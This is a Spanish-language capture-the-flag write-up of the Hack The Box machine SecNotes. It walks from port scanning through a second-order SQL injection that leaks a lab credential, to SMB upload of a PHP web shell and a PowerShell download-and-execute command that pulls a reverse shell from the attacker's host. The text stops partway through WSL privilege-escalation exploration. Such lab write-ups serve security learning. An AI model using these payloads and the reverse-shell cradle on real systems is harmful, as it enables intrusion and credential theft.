---
title: "HTB write-up: Secnotes"
date: 2019-01-18T21:48:46-06:00
tags: ["hackthebox","htb","boot2root","pentesting","ctf"]
categories: ["htb","pentesting"]
draft: false
---

Este es mi primer write-up acerca de la resolución de una maquina de HTB, aunque en hice notas de muchas de las maquinas anteriores, nunca se me hubiera ocurrido llegar a hacer una entrada al respecto.

Curiosamente, esta es también fue mi primera maquina del año y tras alrededor de 6 meses sin resolver maquinas, volví nuevamente con muchas ganas de divertirme.

Sin más, les dejo mis notas.
<!--more-->

# Machine info
La información que tenemos de la maquina es:

Name     | Maker | OS      | IP Address
---      | ---   | ---     | ---
SecNotes | 0xdf  | Windows | 10.10.10.97

Su tarjeta de presentación es:

![Card Info](/img/htb-secnotes/cardinfo.png)

# Port Scanning

Comenzamos por escanear todos los puertos TCP abiertos en la maquina, con la finalidad de poder encontrar los servicios ejecutándose en la maquina:

```
root@kali:~# nmap -sS -p- -n --open 10.10.10.97
Starting Nmap 7.70 ( https://nmap.org ) at c 12:15 CST
Nmap scan report for 10.10.10.97
Host is up (0.47s latency).
Not shown: 65532 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Nmap done: 1 IP address (1 host up) scanned in 428.05 seconds
```

Como backup ejecutamos masscan para verificar que sean los mismos puertos encontrados:

```
root@kali:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.97

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-07 18:45:28 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 445/tcp on 10.10.10.97
Discovered open port 80/tcp on 10.10.10.97
Discovered open port 8808/tcp on 10.10.10.97
```

# Service Identification

Al finalizar el escaneo, procedemos a volver a ejecutar un nmap con la finalidad de identificar los banners de los servicios descubiertos:

```
root@kali:~# nmap -p80,445,8808 -sV -sC 10.10.10.97 -n -Pn
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-07 12:55 CST
Stats: 0:00:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.52% done; ETC: 12:55 (0:00:00 remaining)
Stats: 0:00:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.52% done; ETC: 12:55 (0:00:00 remaining)
Nmap scan report for 10.10.10.97
Host is up (0.24s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h40m00s, deviation: 4h37m08s, median: 0s
| smb-os-discovery:
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2019-01-07T10:55:42-08:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-01-07 12:55:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.93 seconds
```

Encontramos que el banner ha podido identificar que la maquina es un Windows 10, ejecutando IIS en dos puertos (80 y 8808). En el servicio de SMB identificamos el nombre de la maquina (SECNOTES), el WORKGROUP que es HTB. Continuemos por analizar el puerto TCP/80.

# GoBuster + Small dirbuster list

Ejecutamos un ataque de fuerza bruta a las carpetas y archivos del servidor Web mediante gobuster:

```
root@kali:~/htb/secnotes# gobuster -u http://10.10.10.97/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x txt,php -t 20

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.97/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,php
[+] Timeout      : 10s
=====================================================
2019/01/07 17:05:23 Starting gobuster
=====================================================
/contact.php (Status: 302)
/home.php (Status: 302)
/login.php (Status: 200)
/register.php (Status: 200)
/logout.php (Status: 302)
=====================================================
2019/01/07 17:53:35 Finished
=====================================================

```

Al finalizar, podemos observar que hemos encontrado algunas paginas php por lo que comencemos a analizar la aplicación web.

# Httpie across the universe

Comenzamos por ir a "home" /:

```
root@kali:~/htb/secnotes# http http://10.10.10.97
HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Content-Length: 0
Content-Type: text/html; charset=UTF-8
Date: Tue, 08 Jan 2019 00:16:02 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: login.php
Pragma: no-cache
Server: Microsoft-IIS/10.0
Set-Cookie: PHPSESSID=4b1oeeinkoj5bhdfsr8iugvvh7; path=/
X-Powered-By: PHP/7.2.7
```

Nos redirecciona a la pagina login, por lo que cambiamos la petición:

```
root@kali:~/htb/secnotes# http http://10.10.10.97/login.php
HTTP/1.1 200 OK
Content-Length: 1223
Content-Type: text/html; charset=UTF-8
Date: Tue, 08 Jan 2019 00:16:12 GMT
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.2.7

<\!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Notes - Login</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; }
        .wrapper{ width: 350px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Login</h2>
        <p>Please fill in your credentials to login.</p>
        <form action="/login.php" method="post">
            <div class="form-group ">
                <label>Username</label>
                <input type="text" name="username"class="form-control" value="">
                <span class="help-block"></span>
            </div>
            <div class="form-group ">
                <label>Password</label>
                <input type="password" name="password" class="form-control">
                <span class="help-block"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
        </form>
    </div>
</body>
</html>

```

Podemos observar un form para loggearnos y un párrafo abajo indicándonos que podemos registrarnos. Como no tenemos credenciales ni tenemos mas información relevante, vamos a registrarnos para ver hasta que nivel tenemos información:

```
root@kali:~/htb/secnotes# http http://10.10.10.97/register.php
HTTP/1.1 200 OK
Content-Length: 1569
Content-Type: text/html; charset=UTF-8
Date: Tue, 08 Jan 2019 00:18:56 GMT
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.2.7

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Notes - Sign Up</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; }
        .wrapper{ width: 350px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Sign Up</h2>
        <p>Please fill this form to create an account.</p>
        <form action="/register.php" method="post">
            <div class="form-group ">
                <label>Username</label>
                <input type="text" name="username"class="form-control" value="">
                <span class="help-block"></span>
            </div>
            <div class="form-group ">
                <label>Password</label>
                <input type="password" name="password" class="form-control" value="">
                <span class="help-block"></span>
            </div>
            <div class="form-group ">
                <label>Confirm Password</label>
                <input type="password" name="confirm_password" class="form-control" value="">
                <span class="help-block"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Submit">
                <input type="reset" class="btn btn-default" value="Reset">
            </div>
            <p>Already have an account? <a href="login.php">Login here</a>.</p>
        </form>
    </div>
</body>
</html>
```

La pagina de register.php nos pide unicamente que seleccionemos un usuario, una contraseña y ya. Ingresemos este form y creemos un usuario para tener una cookie valida:

```
root@kali:~/htb/secnotes# http --form http://10.10.10.97/register.php username=sdfsdf password=sdfsdfsdf confirm_password=sdfsdfsdf
HTTP/1.1 302 Found
Content-Length: 1593
Content-Type: text/html; charset=UTF-8
Date: Tue, 08 Jan 2019 00:19:50 GMT
Location: login.php
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.2.7

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Notes - Sign Up</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; }
        .wrapper{ width: 350px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Sign Up</h2>
        <p>Please fill this form to create an account.</p>
        <form action="/register.php" method="post">
            <div class="form-group ">
                <label>Username</label>
                <input type="text" name="username"class="form-control" value="sdfsdf">
                <span class="help-block"></span>
            </div>
            <div class="form-group ">
                <label>Password</label>
                <input type="password" name="password" class="form-control" value="sdfsdfsdf">
                <span class="help-block"></span>
            </div>
            <div class="form-group ">
                <label>Confirm Password</label>
                <input type="password" name="confirm_password" class="form-control" value="sdfsdfsdf">
                <span class="help-block"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Submit">
                <input type="reset" class="btn btn-default" value="Reset">
            </div>
            <p>Already have an account? <a href="login.php">Login here</a>.</p>
        </form>
    </div>
</body>
</html>
```

Tan pronto enviamos los valores del form, tenemos un 302 que nos regresa a login. Esto quiere decir que probablemente las credenciales ingresadas fueron validas y que ahora podemos usarlas. Intentemos ingresar con las credenciales:

```
root@kali:~/htb/secnotes# http --form http://10.10.10.97/login.php username=sdfsdf password=sdfsdfsdf
HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Content-Length: 1229
Content-Type: text/html; charset=UTF-8
Date: Tue, 08 Jan 2019 00:20:51 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: home.php
Pragma: no-cache
Server: Microsoft-IIS/10.0
Set-Cookie: PHPSESSID=o3eun2na9f7kks1dd3t989me2m; path=/
X-Powered-By: PHP/7.2.7

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Notes - Login</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; }
        .wrapper{ width: 350px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Login</h2>
        <p>Please fill in your credentials to login.</p>
        <form action="/login.php" method="post">
            <div class="form-group ">
                <label>Username</label>
                <input type="text" name="username"class="form-control" value="sdfsdf">
                <span class="help-block"></span>
            </div>
            <div class="form-group ">
                <label>Password</label>
                <input type="password" name="password" class="form-control">
                <span class="help-block"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
        </form>
    </div>
</body>
</html>
```

Yei, ya tenemos otra redireccion a home y un Set-Cookie. Veamos que hay en home usando la cookie:

```
root@kali:~/htb/secnotes# http http://10.10.10.97/home.php "Cookie: PHPSESSID=o3eun2na9f7kks1dd3t989me2m; path=/"
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Content-Length: 2806
Content-Type: text/html; charset=UTF-8
Date: Tue, 08 Jan 2019 00:25:00 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.2.7

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Notes - Home</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; text-align: center; }
                .accordion {
                        background-color: #eee;
                        color: #444;
                        cursor: pointer;
                        padding: 18px;
                        width: 80%;
                        border: none;
                        text-align: left;
                        outline: none;
                        font-size: 15px;
                        transition: 0.4s;
                }
                .active, .accordion:hover {
                        background-color: #ccc;
                }

                .accordion:after {
                        content: '\002B';
                        color: #777;
                        font-weight: bold;
                        float: right;
                        margin-left: 5px;
                }

                .active:after {
                        content: "\2212";
                }

                .panel {
                        padding: 0 18px;
                        background-color: white;
                        max-height: 0;
                        overflow: hidden;
                        transition: max-height 0.2s ease-out;
                }
    </style>
        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/Gp
GFF93hXpG5KkN" crossorigin="anonymous"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxh
U9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRR
SQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</head>
<body>
        <div class="alert alert-warning">
          Due to GDPR, all users must delete any notes that contain Personally Identifable Information (PII)<br/>Please contact <strong>tyle
r@secnotes.htb</strong> using the contact link below with any questions.        </div>
    <div class="page-header">
        <h1>Viewing Secure Notes for <b>sdfsdf</b></h1>
    </div>
        <div>
        <p>User <strong>sdfsdf</strong> has no notes. Create one by clicking below.</p> </div>
        <div class="btn-group">
        <a href="submit_note.php" class="btn btn-lg btn-block btn-success">New Note</a>
        <a href="change_pass.php" class="btn btn-lg btn-block btn-warning">Change Password</a>
        <a href="logout.php" class="btn btn-lg btn-block btn-danger">Sign Out</a>
        <a href="contact.php" class="btn btn-lg btn-block btn-info">Contact Us</a>
        </div>



        <script>
        var acc = document.getElementsByClassName("accordion");
        var i;

        for (i = 0; i < acc.length; i++) {
          acc[i].addEventListener("click", function() {
                this.classList.toggle("active");
                var panel = this.nextElementSibling.nextElementSibling;
                if (panel.style.maxHeight){
                  panel.style.maxHeight = null;
                } else {
                  panel.style.maxHeight = panel.scrollHeight + "px";
                }
       });
        }
        </script>
</body>
</html>
```

Muy interesante, aunque no tenemos notas, si podemos extraer que existe un usuario tyler@secnotes.htb. Esto nos abre la posibilidad y el guiño a que debemos ir tras de tyler.

Después de intentar un sqli en el login que aceptaba parámetros y un pequeño hit a otra maquina, decidí intentarlo con la otra pagina que también acepta POSTs, register.php.


# Second order sqli

Ok, la teoría es la siguiente:

Hay valores que son almacenados en las bases de datos que en ocasiones son llamados para despegar propiedades, tales como las notas, posts, etc., por ejemplo, Bienvenido usuario XXXX YYYY. Aprovechándonos de que podemos ingresar cualquier usuario (siempre y cuando este no exista previamente), lo que haremos es crear un usuario que con apellido sqli.

```
root@kali:~/htb/secnotes# http --form http://10.10.10.97/register.php "username=miau' or '1'='1" password=miaumiau confirm_password=miaumiau
HTTP/1.1 302 Found
Content-Length: 1600
Content-Type: text/html; charset=UTF-8
Date: Tue, 08 Jan 2019 00:27:55 GMT
Location: login.php
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.2.7

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Notes - Sign Up</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; }
        .wrapper{ width: 350px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Sign Up</h2>
        <p>Please fill this form to create an account.</p>
        <form action="/register.php" method="post">
            <div class="form-group ">
                <label>Username</label>
                <input type="text" name="username"class="form-control" value="miau' or '1'='1">
                <span class="help-block"></span>
            </div>
            <div class="form-group ">
                <label>Password</label>
                <input type="password" name="password" class="form-control" value="miaumiau">
                <span class="help-block"></span>
            </div>
            <div class="form-group ">
                <label>Confirm Password</label>
                <input type="password" name="confirm_password" class="form-control" value="miaumiau">
                <span class="help-block"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Submit">
                <input type="reset" class="btn btn-default" value="Reset">
            </div>
            <p>Already have an account? <a href="login.php">Login here</a>.</p>
        </form>
    </div>
</body>
</html>

```

Observamos que nos ha devuelto un 302 hacia login, bien. Continuemos ahora por ingresar en login usando nuestras credenciales:

```
root@kali:~/htb/secnotes# http --form http://10.10.10.97/login.php "username=miau' or '1'='1" password=miaumiau
HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Content-Length: 1238
Content-Type: text/html; charset=UTF-8
Date: Tue, 08 Jan 2019 00:28:12 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: home.php
Pragma: no-cache
Server: Microsoft-IIS/10.0
Set-Cookie: PHPSESSID=v5er5q1ku6rj1l0vadfrn99nnh; path=/
X-Powered-By: PHP/7.2.7

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Notes - Login</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; }
        .wrapper{ width: 350px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Login</h2>
        <p>Please fill in your credentials to login.</p>
        <form action="/login.php" method="post">
            <div class="form-group ">
                <label>Username</label>
                <input type="text" name="username"class="form-control" value="miau' or '1'='1">
                <span class="help-block"></span>
            </div>
            <div class="form-group ">
                <label>Password</label>
                <input type="password" name="password" class="form-control">
                <span class="help-block"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
        </form>
    </div>
</body>
</html>

```

Great. Tenemos otro 302 hacia home. Usemos ahora el cookie para ver el home de nuestro `amigo' or '1'='1`

```
root@kali:~/htb/secnotes# http http://10.10.10.97/home.php "Cookie: PHPSESSID=v5er5q1ku6rj1l0vadfrn99nnh; path=/"
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Content-Length: 5803
Content-Type: text/html; charset=UTF-8
Date: Tue, 08 Jan 2019 00:28:43 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.2.7

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Notes - Home</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; text-align: center; }
                .accordion {
                        background-color: #eee;
                        color: #444;
                        cursor: pointer;
                        padding: 18px;
                        width: 80%;
                        border: none;
                       text-align: left;
                        outline: none;
                        font-size: 15px;
                        transition: 0.4s;
                }

                .active, .accordion:hover {
                        background-color: #ccc;
                }

                .accordion:after {
                        content: '\002B';
                        color: #777;
                        font-weight: bold;
                        float: right;
                        margin-left: 5px;
                }

                .active:after {
                        content: "\2212";
                }

                .panel {
                        padding: 0 18px;
                        background-color: white;
                        max-height: 0;
                        overflow: hidden;
                        transition: max-height 0.2s ease-out;
                }
    </style>
        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/Gp
GFF93hXpG5KkN" crossorigin="anonymous"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxh
U9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRR
SQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</head>
<body>
        <div class="alert alert-warning">
          Due to GDPR, all users must delete any notes that contain Personally Identifable Information (PII)<br/>Please contact <strong>tyl$
r@secnotes.htb</strong> using the contact link below with any questions.        </div>
    <div class="page-header">
        <h1>Viewing Secure Notes for <b>miau' or '1'='1</b></h1>
    </div>
        <div>
        <button class="accordion"><strong>Mimi's Sticky Buns</strong>  <small>[2018-06-21 09:47:17]</small></button><a href=/home.php?actio$
=delete&id=2" class="btn btn-danger"><strong>X</strong></a><div class="panel center-block text-left" style="width: 78%;"><pre>Ingredients
    For Dough
        1 heaping Tbs. (1 pkg) dry yeast
        1/4 c warm water
        scant 3/4 c buttermilk
        1 egg
        3 c flour
        1/4 shortening
        1/4 c sugar
        1 tsp baking powder
        1 tsp salt
    For Filling
        Butter
        Cinnamon
        1/4 c sugar
    For Sauce
        1/4 c butter
        1/2 c brown sugar
        2 Tbs maple syrup

Instructions
        In 9" sq pan, melt butter, and stir in brown sugar and syrup.
        In a large mixing bowl dissolve yeast in warm water.
        Add buttermilk, egg, half of the flour, shortening, sugar, baking powder, and salt.
        Blend 1/2 min low speed, then 2 min med speed.
        Stir in remaining flour and kneed 5 minutes.
        Roll dough into rectangle about the size of a cookie sheet. Spread with butter, sprinkle with 1/4 c sugar and generously with cinnam
on.
        Roll up, and cut into 9 slices.
        Place in 9" pan in sauce.
        Let rise until double in size, about 1-1.5 hours.
        Bake 25-30 min at 375.</pre></div><button class="accordion"><strong>Years</strong>  <small>[2018-06-21 09:47:54]</small></button><a
href=/home.php?action=delete&id=3" class="btn btn-danger"><strong>X</strong></a><div class="panel center-block text-left" style="width: 78%;
"><pre>1957, 1982, 1993, 2005, 2009*, and 2017</pre></div><button class="accordion"><strong>new site </strong>  <small>[2018-06-21 13:13:46]
</small></button><a href=/home.php?action=delete&id=4" class="btn btn-danger"><strong>X</strong></a><div class="panel center-block text-left
" style="width: 78%;"><pre>\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&</pre></div><button class="accordion"><strong>--'´;#</strong>  <small>[2019-01-07 15:30:06]</small></button><a h
ref=/home.php?action=delete&id=15" class="btn btn-danger"><strong>X</strong></a><div class="panel center-block text-left" style="width: 78%;
"><pre>--'´;#</pre></div><button class="accordion"><strong><?php system('id');?></strong>  <small>[2019-01-07 15:48:51]</small></button><a h
ref=/home.php?action=delete&id=17" class="btn btn-danger"><strong>X</strong></a><div class="panel center-block text-left" style="width: 78%;
"><pre><?php system('id');?></pre></div><button class="accordion"><strong>alert</strong>  <small>[2019-01-07 16:00:02]</small></button><a hr
ef=/home.php?action=delete&id=18" class="btn btn-danger"><strong>X</strong></a><div class="panel center-block text-left" style="width: 78%;"
><pre><script>alert(1)</script></pre></div><button class="accordion"><strong>teste</strong>  <small>[2019-01-07 16:06:04]</small></button><a
 href=/home.php?action=delete&id=19" class="btn btn-danger"><strong>X</strong></a><div class="panel center-block text-left" style="width: 78
%;"><pre>");</pre></div>        </div>
        <div class="btn-group">
        <a href="submit_note.php" class="btn btn-lg btn-block btn-success">New Note</a>
        <a href="change_pass.php" class="btn btn-lg btn-block btn-warning">Change Password</a>
        <a href="logout.php" class="btn btn-lg btn-block btn-danger">Sign Out</a>
        <a href="contact.php" class="btn btn-lg btn-block btn-info">Contact Us</a>
        </div>



        <script>
        var acc = document.getElementsByClassName("accordion");
        var i;

        for (i = 0; i < acc.length; i++) {
          acc[i].addEventListener("click", function() {
                this.classList.toggle("active");
                var panel = this.nextElementSibling.nextElementSibling;
                if (panel.style.maxHeight){
                  panel.style.maxHeight = null;
                } else {
                  panel.style.maxHeight = panel.scrollHeight + "px";
                }
          });
        }
        </script>
</body>
</html>

```

Ahora si tenemos bastantes notas... inclusive una muy interesante:

> \\\\secnotes.htb\\new-site

> tyler / 92g!mA8BGjOirkL%OG*\&

Perfecto las primeras credenciales!

# Listing smb share

Ahora que tenemos al usuario tyler y una contraseña, probemos otro servicio que acepta usuarios y contraseñas... smb:

```
root@kali:~/htb/secnotes# smbclient -U tyler -c 'dir' //10.10.10.97/new-site/ '92g!mA8BGjOirkL%OG*&'
  .                                   D        0  Mon Jan  7 17:18:24 2019
  ..                                  D        0  Mon Jan  7 17:18:24 2019
  iisstart.htm                        A      696  Thu Jun 21 10:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 10:26:03 2018

                12978687 blocks of size 4096. 8041186 blocks available

```

Excelente, pero tal parece que new-site lo hemos visto antes ... parece una pagina por defecto de IIS... claro! el servicio tcp/8808 que descubrimos al inicio.

# Uploading a reverse shell and calling back home

Para la reverse shell, subiré una phpshell de webfuzz, cmd.php, para agilidad y nada mas brincar.

Adicionalmente a esto, después de subirla vía smb, ejecutare un el script de nishang de reverse tcp shell por lo que inicie un servicio de http:

> python -m SimpleHTTPServer 4001

Y también un ncat en el puerto 3001 para recibir la conexión:

> ncat -lvnp 3001

Ahora si, llamemos a esa shell:


```
root@kali:~/htb/secnotes# smbclient -U tyler -c 'put 95456uyjdfg.php' //10.10.10.97/new-site/ '92g!mA8BGjOirkL%OG*&' && http 'http://10.10.10.97:8808/95456uyjdfg.php?cmd=powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.13.141:4001/s.ps1\")"'
putting file 95456uyjdfg.php as \95456uyjdfg.php (0.2 kb/s) (average 0.2 kb/s)

http: error: Request timed out (30s).
```

En la otra shell:

```
root@kali:~/htb/secnotes# ncat -lvnp 3001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::3001
Ncat: Listening on 0.0.0.0:3001
Ncat: Connection from 10.10.10.97.
Ncat: Connection from 10.10.10.97:58546.
Windows PowerShell running as user SECNOTES$ on SECNOTES
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\new-site>ls


    Directory: C:\inetpub\new-site


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/7/2019   1:57 PM                Microsoft
-a----         1/7/2019   2:12 PM            114 95456uyjdfg.php
-a----        6/21/2018   8:26 AM            696 iisstart.htm
-a----        6/21/2018   8:26 AM          98757 iisstart.png
------       12/28/2018  11:26 AM          59392 nc.exe


PS C:\inetpub\new-site> cd ..
PS C:\inetpub> cd ..
PS C:\> cd Users
PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/22/2018   4:44 PM                Administrator
d-----        6/21/2018   2:55 PM                DefaultAppPool
d-----        6/21/2018   1:23 PM                new
d-----        6/21/2018   3:00 PM                newsite
d-r---        6/21/2018   2:12 PM                Public
d-----        8/19/2018  10:54 AM                tyler
d-----        6/21/2018   2:55 PM                wayne


PS C:\Users> cd tyler
PS C:\Users\tyler> ls


    Directory: C:\Users\tyler


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        8/19/2018   3:51 PM                3D Objects
d-----        8/19/2018  11:10 AM                cleanup
d-r---        8/19/2018   3:51 PM                Contacts
d-r---        8/19/2018   3:51 PM                Desktop
d-r---        8/19/2018   3:51 PM                Documents
d-r---        8/19/2018   3:51 PM                Downloads
d-r---        8/19/2018   3:51 PM                Favorites
d-r---        8/19/2018   3:51 PM                Links
d-r---        8/19/2018   3:51 PM                Music
d-r---        8/19/2018   3:10 PM                OneDrive
d-r---        8/19/2018   3:51 PM                Pictures
d-r---        8/19/2018   3:51 PM                Saved Games
d-r---        8/19/2018   3:51 PM                Searches
d-----         1/7/2019   2:13 PM                secnotes_contacts
d-r---        8/19/2018   3:51 PM                Videos
-a----        8/19/2018  10:49 AM              0 .php_history
-a----        6/22/2018   4:29 AM              8 0

```

# cat user.txt

En la carpeta Desktop de Tyler encontraremos la flag de user.txt

> PS C:\Users\tyler> cat Desktop/user.txt


# PrivEsc

Ok, comencemos el camino hasta root.txt...

Vamos a `c:\`

```
PS C:\> ls


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/21/2018   3:07 PM                Distros
d-----        6/21/2018   6:47 PM                inetpub
d-----        6/22/2018   2:09 PM                Microsoft
d-----        4/11/2018   4:38 PM                PerfLogs
d-----        6/21/2018   8:15 AM                php7
d-r---        8/19/2018   2:56 PM                Program Files
d-r---        6/21/2018   6:47 PM                Program Files (x86)
d-r---        6/21/2018   3:00 PM                Users
d-----        8/19/2018  11:15 AM                Windows
-a----        6/21/2018   3:07 PM      201749452 Ubuntu.zip
```

Interesante, el archivo Ubuntu.zip y la carpeta "Distros"... Eso parece una referencia a WSL (Windows Subsystem for Linux), ya que en sus versiones mas modernas, después de instalar las herramientas base, te permite ajustar un entorno de una distribución mediante la tienda de Microsoft.

Tras probar que el binario de bash.exe si existe me aventure a ir a la carpeta /root directamente en busqueda de una flag:

```
PS C:\Distros> bash -c 'ls -lah /root'
total 8.0K
drwx------ 1 root root  512 Jun 22  2018 .
drwxr-xr-x 1 root root  512 Jun 21  2018 ..
---------- 1 root root  411 Jan  8 16:55 .bash_history
-rw-r--r-- 1 root root 3.1K Jun 22  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
